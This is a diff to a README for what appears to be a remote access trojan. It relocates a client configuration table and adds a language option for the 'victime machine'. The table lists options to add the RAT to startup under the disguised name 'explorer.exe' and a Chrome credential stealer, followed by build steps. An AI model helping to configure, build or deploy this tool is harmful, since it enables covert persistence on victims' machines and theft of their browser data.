@@ -19,11 +19,9 @@
 ### Config settings
 |     option     |                     description                         |
 | -------------- |:--------------------------------------------------------|
-|    autorun     | add rat to startup (1-on, 0-off)                        |
 | chrome_stealer | connect sqlite3.h and sqlite3.cpp files to your project |
 |       IP       | white ip of server (default 127.0.0.1)                  |
 |      PORT      | port of ip (default 4001)                               |
-|  autorun_name  | file name at startup (default: "explorer.exe")          |
 
 
 ### <b>Linux distributions</b>:<br/>
@@ -40,8 +38,19 @@
    - server.exe in Debug/
    
 ## Client
+
+### Config settings
+|     option     |                     description                         |
+| -------------- |:--------------------------------------------------------|
+|    autorun     | add rat to startup (1-on, 0-off)                        |
+| chrome_stealer | connect sqlite3.h and sqlite3.cpp files to your project |
+|       IP       | white ip of server (default 127.0.0.1)                  |
+|      PORT      | port of ip (default 4001)                               |
+|  autorun_name  | file name at startup (default: "explorer.exe")          |
+|      lang      | lqnguage the victime machine (optional) (default: "ru") |
+
     - Open in Visual Studio client/client.sln
-    - Change IP and PORT in Config.h
+    - Set the Config.h
     - Compile Ctrl + F5
 
 # Features
